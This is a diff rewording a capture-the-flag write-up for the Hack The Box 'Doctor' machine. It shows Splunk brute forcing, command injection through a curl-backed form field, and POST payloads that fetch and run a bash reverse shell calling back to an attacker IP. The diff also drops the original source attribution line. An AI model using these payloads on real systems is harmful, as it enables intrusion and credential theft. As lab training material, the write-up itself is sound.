@@ -6,14 +6,14 @@ points: 20
 rating: 4
 date: 2020-09-26
 avatar: assets/htb/doctor.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Doctor
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to scan every port, `-sC` (the same as `--script=default`) to fire the default NSE enumeration scripts at the host, `-sV` for service/version detection, and `-oA <name>` to save the results under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/doctor]
@@ -90,33 +90,33 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 147.33 seconds
 ```
 
-Only three ports open: 22 - SSH, 80 - HTTP, and 8089 - Splunk
+Just three ports were listening: 22 - SSH, 80 - HTTP, and 8089 - Splunk
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http-doctor.png)
+![](assets/wu/doctor/img-1.png)
 
-on port 80 found Health Care website; contact information including domain info@doctors.htb
+Port 80 served a health care site; the contact details exposed the domain info@doctors.htb
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http-doctor-usernames.png)
+![](assets/wu/doctor/img-2.png)
 
-Further down the page found some potential usernames: Dr. Jade Guzman, Dr. Hannah Ford, Dr. James Wilson
+Scrolling further down, I spotted some likely usernames: Dr. Jade Guzman, Dr. Hannah Ford, Dr. James Wilson
 
 ### Port 8089 - Splunk
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-splunkd.png)
+![](assets/wu/doctor/img-3.png)
 
-Needed to use https. After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.  Says Splunk build: 8.0.5
+This required https. Once I clicked through the self-signed certificate warnings, I landed on a Splunk Atom Feed. It reports Splunk build: 8.0.5
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-splunkd-login.png)
+![](assets/wu/doctor/img-4.png)
 
-I tried clicking on the services link, but was prompted to enter credentials
+Clicking the services link popped a credential prompt
 
 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
 
 > Universal Forwarder is accessible on each host at [https://host:8089](https://host:8089). Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher.
 
-Crafting a python password brute force tool
+I put together a small python password brute forcer
 
 * [https://requests.readthedocs.io/en/master/user/advanced/\#ssl-cert-verification](https://requests.readthedocs.io/en/master/user/advanced/#ssl-cert-verification)
 * [https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests](https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests)
@@ -157,43 +157,43 @@ with open("/home/kac0/rockyou_utf8.txt", "r") as rockyou:
 print("Thank you for using this service!\n")
 ```
 
-Brute force does not seem to get me anywhere
+The brute force led nowhere
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb.png)
+![](assets/wu/doctor/img-5.png)
 
-Next I tried navigating to doctors.htb...and got redirected to a login page
+Next I browsed to doctors.htb, which bounced me to a login page
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb2.png)
+![](assets/wu/doctor/img-6.png)
 
-Testing for SQLi gives me an error " Nope, no such luck. "
+Probing it for SQLi just returned the error " Nope, no such luck. "
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive.png)
+![](assets/wu/doctor/img-7.png)
 
-found link to /archive in source code,
+The page source revealed a link to /archive,
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive2.png)
+![](assets/wu/doctor/img-8.png)
 
- this page is blank with no content
+ but that page was empty with nothing on it
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb4-register.png)
+![](assets/wu/doctor/img-9.png)
 
-Registered for an account
+I signed up for an account
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb4.png)
+![](assets/wu/doctor/img-10.png)
 
-After I created an account, I noticed a banner at the top of the page warning me that I would only have 20 minutes for it to live.
+Once the account was created, a banner across the top warned that it would only last 20 minutes.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest.png)
+![](assets/wu/doctor/img-11.png)
 
-I tried some basic tests for XSS
+I ran a few simple XSS checks
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest2.png)
+![](assets/wu/doctor/img-12.png)
 
-I could see my post, but no alert after I opened it.
+My post showed up, but opening it triggered no alert.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest3.png)
+![](assets/wu/doctor/img-13.png)
 
-I tried putting a link to my machine in the Content box, but got a message that the link I posted was not valid, but I still got a connection back to my machine
+I then dropped a link to my box into the Content field; the app claimed the link was invalid, yet I still received a callback to my machine
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/doctor]
@@ -206,9 +206,9 @@ User-Agent: curl/7.68.0
 Accept: */*
 ```
 
-Looks like the service is running `curl`. If there is no input sanitization I may be able to get code execution here.
+So the backend is invoking `curl`. If the input isn't sanitized, this could give me code execution.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest4.png)
+![](assets/wu/doctor/img-14.png)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/doctor]
@@ -221,21 +221,21 @@ User-Agent: curl/7.68.0
 Accept: */*
 ```
 
-Putting in a command at the end of my URL results in a request with the `id` context information the service is running under as the user `web`. 
+Appending a command to my URL caused the request to come back with `id` output, confirming the service runs as the user `web`. 
 
-I tried to do some of my normal enumeration such as `cat /etc/passwd`, but it seemed as if I couldn't use any commands with spaces.  Any commands I sent with spaces did not connect back to my machine.
+I attempted my usual enumeration like `cat /etc/passwd`, but commands containing spaces wouldn't work. Anything I sent with a space failed to call back to my machine.
 
 * [https://www.betterhacker.com/2016/10/command-injection-without-spaces.html](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
 
-Didn't work
+No luck
 
 * [https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
 
-in bash $IFS is a space by default
+by default, bash's $IFS expands to a space
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp.png)
+![](assets/wu/doctor/img-15.png)
 
-After discovering that I could use commands by plugging the space with `$IFS`, I sent a lot of different commands trying to enumerate the machine.  \(As you can see below, I only got very limited information back from each attempt.\)
+Once I realized I could substitute `$IFS` for the spaces, I fired off plenty of commands to enumerate the box. \(As shown below, each attempt only returned a small amount of information.\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/doctor]
@@ -271,22 +271,22 @@ Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 <YOUR_IP> - - [07/Feb/2021 21:46:42] "GET /shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash HTTP/1.1" 404 -
 ```
 
-I figured out how to enumerate `/etc/passwd` one line at a time using `tail -n`;
+I worked out how to read `/etc/passwd` a line at a time with `tail -n`;
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-wireshark.png)
+![](assets/wu/doctor/img-16.png)
 
-I hoped that perhaps I could see more of the output in Wireshark, but unfortunately I could not.
+I was hoping Wireshark might reveal more of the output, but it didn't.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-shaun.png)
+![](assets/wu/doctor/img-17.png)
 
- I found a username `shaun` using `tail -n2`.  Next, I tried to see if I could send my SSH key to `shaun`'s`authorized_keys` file but it didn't work.  After that I decided to try to get a reverse shell by sending a bash script and then executing it.
+ Using `tail -n2` I turned up the username `shaun`. I then attempted to drop my SSH key into `shaun`'s`authorized_keys` file, but that failed. So I switched to grabbing a reverse shell by uploading a bash script and running it.
 
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.15.13/8091 0>&1
 ```
 
-my shell script which simply contained a bash reverse shell
+the shell script was just a plain bash reverse shell
 
 ```text
 title=Passwd+Extract&content=http://10.10.15.13:8081/$(curl$IFS'http://10.10.15.13:8081/shell'$IFS'-o'$IFS'/dev/shm/shell')&submit=Post
@@ -296,23 +296,23 @@ title=Passwd+Extract&content=http://10.10.15.13:8081/$(chmod$IFS'+x'$IFS'/dev/sh
 title=Passwd+Extract&content=http%3a//10.10.15.13%3a8081/$(bash$IFS'/dev/shm/shell')&submit=Post
 ```
 
-The three commands I sent through burp traffic: 
+The three commands I pushed through in Burp: 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell.png)
+![](assets/wu/doctor/img-18.png)
 
-sending the file using curl, 
+fetching the file with curl, 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell.png)
+![](assets/wu/doctor/img-19.png)
 
-I verified that the file was there and accessible.
+I confirmed the file had landed and was reachable.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell2.png)
+![](assets/wu/doctor/img-20.png)
 
-chmod +x to make executable, 
+chmod +x to flag it executable, 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell3.png)
+![](assets/wu/doctor/img-21.png)
 
-and executing my shell script
+and finally running my shell script
 
 ```text
 <YOUR_IP> - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
@@ -326,7 +326,7 @@ and executing my shell script
 <YOUR_IP> - - [12/Feb/2021 19:23:44] "GET / HTTP/1.1" 200 -
 ```
 
-I got a connection back from the remote host which downloaded my shell script
+The remote host called back and pulled down my shell script
 
 ## Road to User
 
@@ -349,7 +349,7 @@ export TERM=xterm-256color
 web@doctor:~$
 ```
 
-After the shell script ran I receieved a connection from the reverse shell to my waiting netcat listener. Python2 wasn't installed, but python3 was.+-
+When the script executed, the reverse shell connected back to my waiting netcat listener. Python2 was absent, but python3 was present.+-
 
 ### Further enumeration
 
@@ -360,7 +360,7 @@ uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 doctor
 ```
 
-I was running as the user `web` which I immediately noticed was a member of the `adm` group.
+I was the `web` user, and right away I noticed it belonged to the `adm` group.
 
 ### Finding user creds
 
@@ -450,9 +450,9 @@ find / -group adm 2>/dev/null
 web@doctor:~$
 ```
 
-`adm` group can access process files and logs in /var/log
+membership in `adm` grants read access to process files and the logs under /var/log
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell-pass.png)
+![](assets/wu/doctor/img-22.png)
 
 ```text
 web@doctor:/var/log$ grep password * 2>/dev/null
@@ -477,9 +477,9 @@ auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user s
 auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
 ```
 
-There were no useful hits for the word 'password' in these log files.
+Grepping these log files for 'password' surfaced nothing useful.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell-pass-backup.png)
+![](assets/wu/doctor/img-23.png)
 
 ```text
 web@doctor:/var/log/apache2$ grep -i pass * 2>/dev/null
@@ -507,7 +507,7 @@ backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=G
 error.log.1:[Fri Feb 12 11:17:55.910884 2021] [authz_core:error] [pid 2637] [client 10.10.14.70:49358] AH01630: client denied by server configuration: /var/www/html/.htpasswd
 ```
 
-however in the apache2 folder there was a file named access.log.1 that contained even more log information, including a history of web searches for how to crack passwords and creating strong passwords. Then, in the file `backup` I found a attempt by the user to change thier password. It seems like the user got scared and decided to change his web password. I decided to check if this password would work for the other user on the machine \(`shaun`\).
+the apache2 directory, though, held an access.log.1 with a lot more logging, including searches about cracking passwords and building strong ones. Then in the `backup` file I found the user trying to reset their password, it looks like they panicked and changed their web password. I figured I'd test whether that password also worked for the other account on the box \(`shaun`\).
 
 ### User.txt
 
@@ -553,7 +553,7 @@ sudo -l
 Sorry, user shaun may not run sudo on doctor.
 ```
 
-Could not use `sudo` as this user.  However, now that I had credentials, I could potentially use the exploit for splunkd that I had found earlier...
+This user had no `sudo` rights. But now that I held valid credentials, the splunkd exploit I'd come across earlier became viable...
 
 ```sql
 ┌──(kac0㉿kali)-[~/htb/doctor]
@@ -584,14 +584,14 @@ INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog
 COMMIT;
 ```
 
-Found a password hash in the file `site.db`. I was unable to crack it with hashcat, however.
+The file `site.db` contained a password hash, though hashcat couldn't crack it.
 
 * [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) 
 * [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-splunk-login.png)
+![](assets/wu/doctor/img-24.png)
 
-Was able to use `shaun`'s credentials to log into `/services` page on the Splunk site.
+`shaun`'s credentials got me into the `/services` page on the Splunk site.
 
 ### Getting a shell
 
@@ -609,7 +609,7 @@ parser.add_argument('--payload-file', default="payload.sh")
 options = parser.parse_args()
 ```
 
-In the exploit I had to configure some parameters
+I had to set a few parameters in the exploit
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/doctor]
